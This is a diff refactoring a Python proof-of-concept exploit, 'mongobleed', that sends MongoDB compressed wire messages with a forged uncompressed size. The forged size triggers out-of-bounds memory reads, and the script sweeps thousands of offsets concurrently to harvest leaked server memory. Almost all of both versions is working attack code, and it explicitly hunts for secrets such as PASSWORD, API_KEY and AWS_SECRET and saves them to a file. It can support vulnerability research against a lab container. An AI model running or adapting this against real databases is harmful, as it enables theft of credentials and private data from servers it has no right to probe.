@@ -1,94 +1,156 @@
-#!/usr/bin/env python3
-# docker compose down -v && docker compose up -d && sleep 10
-# python3 mongobleed.py --host localhost
+'''
+Notes
 
-import socket, struct, zlib, re, argparse, time, os, subprocess
+- struct.pack / struct.unpack
+  - Purpose: Convert between Python values and C-like binary layouts.
+  - Endianness: '<' = little-endian. Formats used here:
+    - '<i' = 4-byte signed int (BSON length).
+    - '<I' = 4-byte unsigned int (Mongo headers/opcodes, message lengths).
+  - Example: struct.pack('<IIII', a, b, c, d) builds a 16-byte Mongo header.
 
-def probe(host, port, doc_len):
-    bson = struct.pack('<i', doc_len) + b'\x10a\x00\x01\x00\x00\x00'  
-    # '<i' = little-endian signed int (BSON doc length), 
-    # '\x10' = int32 type, 'a\x00' = field name "a" null-terminated, 
-    # '\x01\x00\x00\x00' = value 1
-    payload = (struct.pack('<I', 2013) +  # '<I' = little-endian unsigned int, 2013 = original opcode (OP_MSG)
-               struct.pack('<i', doc_len + 500) +  # Forged uncompressed size (larger than actual to trigger out-of-bounds read)
-               b'\x02' +  # Compression type: 2 = zlib
-               zlib.compress(struct.pack('<I', 0) + b'\x00' + bson))  # Compressed payload: flags (0) + section kind (0) + BSON doc
+- concurrent.futures.ThreadPoolExecutor / as_completed
+  - ThreadPoolExecutor(n): Runs callables concurrently in a pool of n threads.
+  - submit(fn, ...): Returns a Future representing the async execution.
+  - as_completed(iterable_of_futures): Yields futures as they finish (not in submit order).
+
+- socket.create_connection
+  - Opens a TCP socket to (host, port) with timeout; returns a connected socket.
+  - Used with sendall(...) to write all bytes, and recv(n) to read up to n bytes.
+
+- bytearray vs bytes
+  - bytearray: mutable buffer efficient for incremental appends (extend, etc.).
+  - bytes: immutable snapshot; convert via bytes(bytearray_obj) when done.
+
+'''
+
+
+# Constants only; imports are self-explanatory
+import argparse
+import os
+import socket
+import struct
+import time
+import zlib
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from pathlib import Path
+
+# Constants
+OP_MSG = 2013
+OP_COMPRESSED = 2012
+COMPRESSOR_ZLIB = 2
+HEADER_SIZE = 16
+COMPRESSED_HEADER_SIZE = 9
+SIZE_PAD = 500
+
+
+# [1] Helper: read exactly n bytes from a socket
+def _recv_exact(s: socket.socket, n: int) -> bytes:
+    # Loop until n bytes are read or the socket closes
+    buf = bytearray()
+    while len(buf) < n:
+        chunk = s.recv(n - len(buf))
+        if not chunk:
+            raise ConnectionError('socket closed')
+        buf.extend(chunk)
+    return bytes(buf)
+
+# [2] probe: craft payload, send, read
+def probe(host: str, port: int, doc_len: int, timeout: float) -> bytes:
+    # Craft BSON with claimed length ("offset") and compress it
+    bson = struct.pack('<i', doc_len) + b'\x10a\x00\x01\x00\x00\x00'
+    payload = (struct.pack('<I', OP_MSG) + struct.pack('<i', doc_len + SIZE_PAD) + bytes([COMPRESSOR_ZLIB]) + zlib.compress(struct.pack('<I', 0) + b'\x00' + bson)
+    )
+
     try:
-        s = socket.socket()  # Create TCP socket
-        s.settimeout(2)  # 2 second timeout
-        s.connect((host, port))  # Connect to MongoDB
-        s.sendall(struct.pack('<IIII',  # '<IIII' = four little-endian unsigned ints (MongoDB wire protocol header)
-                              16 + len(payload),  # messageLength: header (16 bytes) + payload
-                              1,  # requestID: arbitrary client identifier
-                              0,  # responseTo: 0 for client requests
-                              2012) + payload)  # opCode: 2012 = OP_COMPRESSED
-        # Receive full response from MongoDB
-        response = b''
-        while len(response) < 4:  # First, get the 4-byte length header
-            response += s.recv(4096)
-        msg_len = struct.unpack('<I', response[:4])[0]  # Total message length
-        while len(response) < msg_len:  # Keep reading until we have the full message
-            response += s.recv(4096)
-        s.close()
-        
-        # check if it's compressed
-        opcode = struct.unpack('<I', response[12:16])[0]  # opCode is at bytes 12-16
-        if opcode == 2012:  # OP_COMPRESSED
-            raw = zlib.decompress(response[25:])  # Skip 16-byte header + 9-byte compression header
+        with socket.create_connection((host, port), timeout=timeout) as s:
+            # Send compressed OP_COMPRESSED(OP_MSG) and read a full length-prefixed reply
+            header = struct.pack('<IIII', HEADER_SIZE + len(payload), 1, 0, OP_COMPRESSED)
+            s.sendall(header + payload)
+            prefix = _recv_exact(s, 4)
+            msg_len = struct.unpack('<I', prefix)[0]
+            rest = _recv_exact(s, msg_len - 4)
+            response = prefix + rest
+
+        # [3] Unwrap inner message (decompress if server replied compressed)
+        opcode = struct.unpack('<I', response[12:16])[0]
+        if opcode == OP_COMPRESSED:
+            raw = zlib.decompress(response[HEADER_SIZE + COMPRESSED_HEADER_SIZE :])
         else:
-            raw = response[16:]  # Skip 16-byte header only
-        
-        matches = re.findall(rb"field name '([^']+)'", raw)
+            raw = response[HEADER_SIZE:]
+        return raw
+    except Exception:
+        return b""
 
-        # Filter out boring/expected field names, keep only leaked data
-        return [m for m in matches if m not in [b'?', b'a', b'$db', b'ping']]
-    except: 
-        return []
+# [4] run_exploit: sweep lengths concurrently
+def run_exploit(host: str, port: int, max_offset: int, concurrency: int, timeout: float) -> str:
+    # Use different claimed BSON lengths to shift read offsets (I/O-bound → threads help)
+    seen = set()
+    # Accumulate all unique leaked bytes across successful probes
+    out = bytearray()
+    
+    # Create a thread pool to run probes concurrently
+    with ThreadPoolExecutor(concurrency) as pool:
+        # Submit one job per length in [20, max_offset) (different offsets)
+        jobs = {
+            pool.submit(probe, host, port, length, timeout): length
+            for length in range(20, max_offset)
+        }
+        # [5] Collect unique chunks as futures complete (fastest first)
+        for fut in as_completed(jobs):
+            try:
+                chunk = fut.result()
+                # Skip empty replies and chunks already collected
+                if not chunk or chunk in seen:
+                    continue
+                seen.add(chunk)
+                # Append raw bytes and a newline for readability
+                out.extend(chunk)
+                out.extend(b"\n")
+            except Exception:
+                # Ignore individual probe failures; keep collecting others
+                pass
+    
+    # Decode bytes to text; replace undecodable sequences
+    return out.decode('utf-8', errors='replace')
 
-def run_exploit(host, port, max_offset):
-    from concurrent.futures import ThreadPoolExecutor, as_completed
-    
-    all_leaked_bytes = bytearray()
-    already_seen = set()
-    
-    # Run 50 probes at a time for speed
-    with ThreadPoolExecutor(50) as pool:
-        
-        # Queue up one probe() call for each BSON length from 20 to max_offset
-        # Each length reads from a different memory location
-        jobs = {pool.submit(probe, host, port, length): length 
-                for length in range(20, max_offset)}
-        
-        # Collect results as they complete
-        for completed_job in as_completed(jobs):
-            leaked_strings = completed_job.result()
-            for s in leaked_strings:
-                if s not in already_seen:
-                    already_seen.add(s)
-                    all_leaked_bytes.extend(s)
-    
-    return all_leaked_bytes.decode('utf-8', errors='replace')
-
-if __name__ == '__main__':
+# [6] main: parse args, orchestrate attempts
+def main() -> None:
+    # Parse CLI options
     p = argparse.ArgumentParser()
     p.add_argument('--host', default='localhost')
     p.add_argument('--port', type=int, default=27017)
-    p.add_argument('--container', default='mongobleed-target')
     p.add_argument('--max-offset', type=int, default=50000)
     p.add_argument('--output', default='leaked.txt')
-    a = p.parse_args()
-    output_path = os.path.abspath(a.output)
-    
-    for attempt in range(1, 6):  # Retry up to 5 times (memory layout varies)
-        print(f"- Attempt {attempt}/5 | scanning {a.host}:{a.port}...")
-        t = time.time()
-        result = run_exploit(a.host, a.port, a.max_offset)
-        if 'API_KEY' in result or 'AWS_SECRET' in result or 'PASSWORD_Super' in result:  # Check for secret patterns
-            open(output_path, 'w').write(result)
-            print(f"SUCCESS! Secrets leaked in {time.time()-t:.1f}s -> {output_path}")
+    p.add_argument('--concurrency', type=int, default=50)
+    p.add_argument('--timeout', type=float, default=2.0)
+    p.add_argument('--retries', type=int, default=5)
+    args = p.parse_args()
+
+    # Prepare output target and best-effort accumulator
+    output_path = Path(os.path.abspath(args.output))
+    best = ""
+    # [7] Retry loop: run exploit sweeps
+    for attempt in range(1, args.retries + 1):
+        print(f"- Attempt {attempt}/{args.retries} | scanning {args.host}:{args.port}...")
+        t0 = time.time()
+        result = run_exploit(
+            args.host, args.port, args.max_offset, args.concurrency, args.timeout
+        )
+        elapsed = time.time() - t0
+        # [8] Success: if hit, save and exit early
+        if "PASSWORD" in result:
+            output_path.write_text(result)
+            print(f"Found PASSWORD in {elapsed:.1f}s -> {output_path}")
             break
-        else:
-            print(f"No secrets found ({time.time()-t:.1f}s), retrying...")
+        # Keep the longest capture so far as a fallback
+        if len(result) > len(best):
+            best = result
+        print(f"Completed in {elapsed:.1f}s (no PASSWORD)")
     else:
-        open(output_path, 'w').write(result)
-        print(f"No secrets after 5 attempts. Output saved to {output_path}")
+        # [9] Fallback: save best-effort output
+        output_path.write_text(best)
+        print(f"No PASSWORD found. Output saved to {output_path}")
+
+
+if __name__ == '__main__':
+    main()
